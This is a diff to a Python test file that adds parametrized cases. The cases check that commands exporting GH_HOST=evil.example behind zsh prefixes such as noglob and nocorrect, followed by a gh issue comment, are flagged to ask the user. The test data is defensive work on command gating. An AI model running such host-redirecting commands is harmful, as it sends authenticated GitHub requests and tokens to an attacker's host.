@@ -84,6 +84,13 @@ def test_a_variable_set_on_the_line_makes_every_gh_call_ask(name: str, form: str
             "command export GH_HOST=evil.example; gh issue comment 1 -R furedea/agent-config -b ok",
             id="an export run through command",
         ),
+        *(
+            pytest.param(
+                f"{word} export GH_HOST=evil.example; gh issue comment 1 -R furedea/agent-config -b ok",
+                id=f"an export behind zsh's {word}",
+            )
+            for word in ("noglob", "nocorrect", "-")
+        ),
     ],
 )
 def test_other_ways_to_change_the_environment_ask(command: str) -> None:
